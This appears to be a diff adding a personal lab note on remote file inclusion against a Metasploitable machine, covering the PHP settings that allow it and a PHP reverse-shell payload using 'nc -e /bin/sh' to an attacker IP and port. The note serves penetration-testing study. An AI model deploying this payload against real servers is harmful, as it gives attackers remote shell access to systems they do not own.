@@ -1,0 +1,28 @@
+### Remote File Inclusion Vulnerabilities
+
+* Remote file inclusion vulnerabilties are similar to local file inclusion
+* The difference is this time we run php files from another server onto this server.
+
+* But first i'm to going to have to change the settings on the server to allow php files outside of this server.
+* Allow_url and allow_url_fopen are two settings that need to be on before we can include any files outside of the server.
+
+* Then restart the apache2 web server.
+
+---
+
+* For remote file inclusion to work you will need a server to host your php files on.
+* But as i'm on the same network as the metasploitable machine i will not need this.
+
+* So first create a php shell.
+
+```php
+<?php
+
+passthru('nc -e /bin/sh 10.0.2.15 4444');
+
+?>
+```
+
+* Then we save this as a .txt file as we don't want to being executed as php file on my machine.
+
+
